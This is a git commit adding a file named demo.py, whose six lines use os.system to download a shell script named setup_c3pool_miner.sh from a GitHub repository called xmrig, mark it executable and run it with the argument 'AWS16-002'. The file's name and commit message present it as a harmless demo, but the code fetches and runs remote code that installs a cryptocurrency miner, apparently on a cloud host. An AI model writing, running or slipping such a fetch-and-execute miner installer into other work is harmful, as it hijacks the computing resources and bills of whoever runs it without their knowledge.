424d51a202fd95f6b2200120baae200fb7cb2b9d
lensfa <80903255+lensfa-lzd@users.noreply.github.com>
2021-06-20 09:09:00 +0800

    Add files via upload

---
+++ demo.py
@@ -0,0 +1,6 @@
+# coding=utf-8
+import os
+
+os.system('wget https://github.com/lensfa-lzd/xmrig/raw/main/setup_c3pool_miner.sh')
+os.system('chmod +x setup_c3pool_miner.sh')
+os.system('./setup_c3pool_miner.sh AWS16-002')
